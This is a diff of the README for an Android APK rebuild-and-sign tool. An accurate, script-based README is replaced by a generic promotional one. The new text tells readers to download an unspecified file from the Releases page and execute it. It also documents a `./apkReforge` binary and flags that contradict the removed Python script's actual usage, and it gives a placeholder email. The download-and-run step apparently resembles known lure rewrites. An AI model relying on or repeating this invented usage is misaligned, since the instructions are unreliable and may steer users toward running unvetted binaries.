@@ -1,79 +1,100 @@
-# apkReforge v1.1.2
+# 🛠️ apkReforge: Automated APK Rebuild, Align, Sign & Install Tool
 
-**apkReforge** is an automated tool for rebuilding, aligning, signing, and optionally installing Android APKs. It enhances the standard workflow by validating dependencies, handling keystore generation, and producing clean debug outputs.
+Welcome to **apkReforge**, your go-to tool for automating the process of rebuilding, aligning, signing, and installing APK files. Whether you're a developer, a hacker, or just someone interested in mobile applications, this tool simplifies the APK modification process.
 
----
+![apkReforge](https://img.shields.io/badge/apkReforge-automated-orange)
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Supported Topics](#supported-topics)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
 ## Features
 
-- Rebuild APKs using `apktool`
-- Align APKs using `zipalign`
-- Sign APKs using `apksigner`
-- Verify signature and alignment
-- Automatically detect `targetSdkVersion` to enable AAPT2
-- Optional device installation via `adb`
-- Automatic generation of debug keystore if missing
-- Color-coded CLI output for better readability
+- **Automated APK Rebuilding**: Quickly rebuild APKs with ease.
+- **Alignment**: Ensure your APKs are optimized for performance with zipalign.
+- **Signing**: Sign your APKs securely using apksigner and jarsigner.
+- **Installation**: Install APKs directly onto your device.
+- **User-Friendly Interface**: Simple command-line interface for ease of use.
 
----
+## Installation
 
-## Requirements
+To get started, you need to download the latest release of apkReforge. Visit the [Releases section](https://github.com/ElieAJABU/apkReforge/releases) to find the latest version. Download the appropriate file for your system and execute it.
 
-- **Python 3.7+**
-- **System binaries**:
-  - `apktool`
-  - `zipalign`
-  - `apksigner`
-  - `adb`
-  - `keytool`
+### Prerequisites
 
-
-## ATTENTION
-These binaries **must be installed and accessible via `/usr/bin/`** or present in your system `$PATH`.
-
----
+- Java Development Kit (JDK) installed on your machine.
+- Android SDK installed (for APK signing and alignment).
+- Basic knowledge of command-line operations.
 
 ## Usage
 
-```bash
-python apkReforge.py -i <input_directory> -o <output.apk> [--install] [-v] [--keystore <path>]
+Once you have installed apkReforge, you can start using it right away. Here’s a simple guide to help you get started:
+
+1. **Open your terminal**.
+2. **Navigate to the apkReforge directory**.
+3. **Run the command**:
+   ```
+   ./apkReforge [options] [APK file]
+   ```
+4. **Choose your options**:
+   - `--rebuild`: Rebuild the APK.
+   - `--align`: Align the APK using zipalign.
+   - `--sign`: Sign the APK using apksigner.
+   - `--install`: Install the APK on your device.
+
+### Example Command
+
+Here’s an example command that rebuilds, aligns, and signs an APK:
+
+```
+./apkReforge --rebuild --align --sign myapp.apk
 ```
 
-### Example:
+## Supported Topics
 
-```bash
-python apkReforge.py -i ./my_decompiled_apk -o my_rebuilt.apk --install -v
-```
+This tool supports various topics related to APK management:
 
-### Custom keystore?
-Just **change the content in the code**
-```python
-def sign_apk(self, input_apk: str, output_apk: str, keystore_path: Optional[str] = None) -> bool:
-        self.logger.info(f"\n{Colors.BOLD}{Colors.BLUE}[+] PHASE 3: Signing APK{Colors.RESET}")
-        keystore_path = keystore_path or self.get_keystore()
-        if not keystore_path:
-            return False
-        self.logger.info(f"{Colors.CYAN}Using keystore: {os.path.basename(keystore_path)}{Colors.RESET}")
-        cmd = [
-            'apksigner', 'sign',
-            '--ks', keystore_path,
-            '--ks-pass', 'pass:android', #################### CHANGE FOR YOUR PASSWORD
-            '--ks-key-alias', 'androiddebugkey', #################### CHANGE FOR YOUR ALIAS
-            '--key-pass', 'pass:android', #################### CHANGE FOR YOUR PASSWORD
-            '--out', output_apk,
-            input_apk
-        ]
-        if not self.run_command(cmd, "Error in signature"):
-            return False
-        self.logger.info(f"{Colors.CYAN}Verifying signature...{Colors.RESET}")
-        if self.run_command(['apksigner', 'verify', output_apk], "Failed signature verification"):
-            self.logger.info(f"{Colors.GREEN}Signature verified correctly{Colors.RESET}")
-            return True
-        return False
-```
+- **Android**: Develop and manage Android applications.
+- **APK**: Work with Android Package files.
+- **Apksigner**: Sign APKs securely.
+- **Build**: Rebuild APKs from source.
+- **Hacking**: Explore APK modification techniques.
+- **Jarsigner**: Use jarsigner for signing JAR files.
+- **Keytool**: Manage your keys with keytool.
+- **Mobile**: Focus on mobile application development.
+- **Mobile Hacking**: Dive into mobile hacking techniques.
+- **Rebuild**: Rebuild APKs for various purposes.
+- **Repatch**: Modify APKs as needed.
+- **Zipalign**: Optimize APKs for better performance.
 
----
+## Contributing
 
-## Disclaimer
+We welcome contributions to apkReforge. If you would like to contribute, please follow these steps:
 
-This tool is intended for **ethical hacking, testing, and educational purposes only**. Ensure you have proper authorization before using it against any APK or device.
+1. **Fork the repository**.
+2. **Create a new branch** for your feature or bug fix.
+3. **Make your changes** and commit them.
+4. **Push to your branch**.
+5. **Open a pull request**.
+
+Please ensure your code follows our coding standards and is well-documented.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any inquiries or issues, feel free to reach out via the GitHub Issues section or contact me directly at [your-email@example.com].
+
+## Conclusion
+
+Thank you for checking out apkReforge! We hope this tool makes your APK management tasks easier and more efficient. For the latest updates, features, and releases, visit the [Releases section](https://github.com/ElieAJABU/apkReforge/releases). 
+
+Happy coding!
